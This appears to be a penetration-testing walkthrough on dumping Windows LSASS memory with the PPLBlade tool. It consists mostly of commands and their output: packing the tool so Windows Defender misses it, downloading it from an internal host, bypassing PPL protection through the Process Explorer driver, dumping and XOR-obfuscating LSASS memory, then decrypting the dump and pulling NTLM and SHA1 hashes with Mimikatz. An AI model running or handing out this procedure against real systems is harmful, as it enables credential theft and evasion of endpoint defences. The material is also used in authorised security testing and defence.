==================================================================================================================================
OS Credential Dumping (LSASS) using 'PPLBlade'
==================================================================================================================================

After a user logs on a Windows computer, the system generates and stores a variety of credential materials in LSASS process memory. 
Our objective is to extract the password hashes of the local and/or domain accounts stored in the memory of the Local Security 
Authority Subsystem Service (LSASS process) of a target Windows computer. 
A valid local or domain Windows account member of the 'local administrator' group is required for dumping the LSASS process.

> Usefull link: https://attack.mitre.org/techniques/T1003/001/


PPLBlade is a protected process memory dumper tool that allows to dump the LSASS memory of a target Windows computer and to store the memory dump in a XOR encrypted file locally or remotely.
It can also be used to bypass PPL protection using the Process Explorer driver 'PROCEXP15.SYS'. 

=> Github: https://github.com/tastypepperoni/PPLBlade

Key features
-------------
> Bypassing PPL protection
> Obfuscating memory dump files to evade Defender AV signature-based detection mechanisms
> Uploading memory dump with RAW and SMB upload methods without dropping it onto the disk (fileless dump)

Modes
-------
1. Dump - Dump process memory using PID or Process Name
2. Decrypt - Revert obfuscated(--obfuscate) dump file to its original state
3. Cleanup - Do cleanup manually, in case something goes wrong on execution (Note that the option values should be the same as for the execution, we're trying to clean up)
4. DoThatLsassThing - Dump lsass.exe using Process Explorer driver (basic poc)


======================================================================================================================
POC/Basic test - Dumping the LSASS memory of a Windows 10 laptop (fully patched with the Windows Defender AV enabled)
======================================================================================================================

----------------------------------------------------------------------------------------------------------------------
Step 1. Download the tool's source code, compile it and pack it
----------------------------------------------------------------------------------------------------------------------

=> Source code: https://github.com/tastypepperoni/PPLBlade

You need to pack the tool as it is flagged by most AV solutions such as Windows Defender.
Many packers can be used. To learn about AV bypass techniques please refer to the section 'Defense evasion (examples)' of this Github project.


----------------------------------------------------------------------------------------------------------------------
Step 2 - Download and execute the packed version of the tool 'PPLBlade' on a target Windows 10 laptop
----------------------------------------------------------------------------------------------------------------------
 
C:\Temp> powershell

PS C:\Temp> wget -URI http://192.168.10.10/Packed-PPLbade.exe -OutFile C:\Temp\Packed-PPLbade.exe

PS C:\Temp> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True


PS C:\Temp> ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    270      17     4716      13880       1.48  10164   0 AppHelperCap
    434      25    15744      44292       1.25  13008   2 ApplicationFrameHost
     78       5     2820       5348       0.02   3832   2 cmd
<SNIP>
   1543      32     8768      57844      15.88     84   0 lsass
<SNIP>

PS C:\Temp> exit


=> Test 1
----------
C:\Temp> Packed-PPLbade.exe -dumpname memory.dmp -key superkey -mode dump -name lsass -obfuscate -pid 84
[+] SeDebugPrivilege enabled successfully
[+] Targeting process with PID: 84
[+] Obtained process handle: 0xc00000e780
[+] Attempting to dump process
[+] Process memory dumped successfully
[+] Obfuscating memory dump
[+] Dump saved in file memory.dmp

C:\Temp>dir
 Volume in drive C is Windows
 Volume Serial Number is F06E-DC58

 Directory of C:\Temp

11/19/2023  02:19 AM    <DIR>          .
11/19/2023  02:19 AM    <DIR>          ..
11/19/2023  02:17 AM        79,409,696 memory.dmp
11/19/2023  02:15 AM         2,585,600 Packed-PPLbade.exe
               2 File(s)     81,995,296 bytes
               2 Dir(s)  75,326,201,856 bytes free


=> Test 2
----------
C:\Temp> Packed-PPLbade.exe -mode dothatlsassthing

[+] SeDebugPrivilege enabled successfully
[+] Service set up successfully
[+] Service started successfully
[+] SeDebugPrivilege enabled successfully
[+] Targeting process with PID: 84
[+] Obtained process handle: 0xc000182018
[+] Attempting to dump process
[+] Process memory dumped successfully
[+] Dump saved in file PPLBlade.dmp
[+] Service removed successfully
[+] Driver removed successfully

C:\Temp>dir
 Volume in drive C is Windows
 Volume Serial Number is F06E-DC58

 Directory of C:\Temp

11/19/2023  02:28 AM    <DIR>          .
11/19/2023  02:28 AM    <DIR>          ..
11/19/2023  02:17 AM        79,409,696 memory.dmp
11/19/2023  02:15 AM         2,585,600 Packed-PPLbade.exe
11/19/2023  02:28 AM        79,448,722 PPLBlade.dmp
               3 File(s)    240,853,714 bytes
               2 Dir(s)  75,097,145,344 bytes free



------------------------------------------------------------------------------------------------------------------------------------------------------
Step 3 - Copy the lsass memory dump (XOR encrypted file) on your attacker VM, then decrypt it and extract the password hashes using the tool Mimikatz
------------------------------------------------------------------------------------------------------------------------------------------------------

C:\Users\Pentester\Desktop> Packed-PPLbade.exe -mode decrypt -dumpname memory.dmp --key superkey
[+] Deobfuscated dump saved in file memory_unxored.dmp

C:\Users\Pentester\Desktop> dir
 Volume in drive C is Windows
 Volume Serial Number is F06E-DC58

 Directory of C:\Temp

11/19/2023  02:33 AM    <DIR>          .
11/19/2023  02:33 AM    <DIR>          ..
11/19/2023  02:33 AM        79,409,696 memory_unxored.dmp
<SNIP>


C:\Users\Pentester\Desktop> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 31 2021 00:08:47
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # sekurlsa::minidump memory_unxored.dmp
Switch to MINIDUMP : 'memory_unxored.dmp'

mimikatz(commandline) # sekurlsa::LogonPasswords
Opening : 'memory_unxored.dmp' file for minidump...

Authentication Id : 0 ; 7631666 (00000000:00747332)
Session           : Interactive from 2
User Name         : auditor
Domain            : LAB.TEST
Logon Server      : DC1
Logon Time        : 11/16/2023 9:04:05 AM
SID               : S-1-5-21-666114207-261065646-224150901-1121
	msv :	
	 [00000003] Primary
	 * Username : auditor
	 * Domain   : LAB
	 * NTLM     : 16ba02ce7a71523cdd4<SNIP>
	 * SHA1     : c69662da50e09b6b624<SNIP>
	 * DPAPI    : 53175f8deda865e8ede<SNIP>
	tspkg :	
	 * Username : auditor
	 * Domain   : LAB.TEST
	 * Password : <SNIP>
	wdigest :	
	 * Username : auditor
	 * Domain   : LAB.TEST
	 * Password : (null)
	kerberos :	
	 * Username : auditor
	 * Domain   : LAB.TEST
	 * Password : <SNIP>
	ssp :	
	credman :	
<SNIP>


Note
------
On a Linux VM the commands to decrypt the memory dump file would be:
=> python3 deobfuscate.py --mode decrypt --dumpname memory.dmp ---key superkey
